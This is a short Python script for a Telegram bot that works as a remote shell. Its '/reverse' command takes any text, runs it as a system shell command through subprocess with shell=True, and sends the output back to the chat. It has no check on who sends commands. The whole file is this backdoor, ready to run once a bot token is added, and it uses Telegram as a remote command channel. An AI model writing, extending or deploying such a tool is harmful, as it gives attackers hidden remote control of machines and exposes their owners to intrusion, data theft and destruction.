from telebot import TeleBot, types
import subprocess

# Set here the Telegram bot token
BOT_TOKEN = ""
bot = TeleBot(BOT_TOKEN)

commands = [
    types.BotCommand("/reverse", "/reverse <shell_command>")
]

bot.set_my_commands(commands=commands)

@bot.message_handler(commands=['reverse'])
def reverse_shell(message):
    command = extract_command(message.text)
    if command != "":
        print(f"Command received: {command}")
        out = run_command(command)
        if len(out) > 1000:
            bot.reply_to(message, "Message too long...")
            chunk_size = 1000
            for i in range(0, len(out), chunk_size):
                bot.send_message(message.chat.id, out[i:i+chunk_size])
        else:
            bot.reply_to(message, out)

def extract_command(message):
    command_prefix = "/reverse"
    if message.startswith(command_prefix):
        return message[len(command_prefix):].strip()
    else:
        return None

def run_command(command):
    try:
        result = subprocess.check_output(command, shell=True, text=True)
        return result.strip()
    except subprocess.CalledProcessError as e:
        return f"Some error: {e}"


bot.infinity_polling()
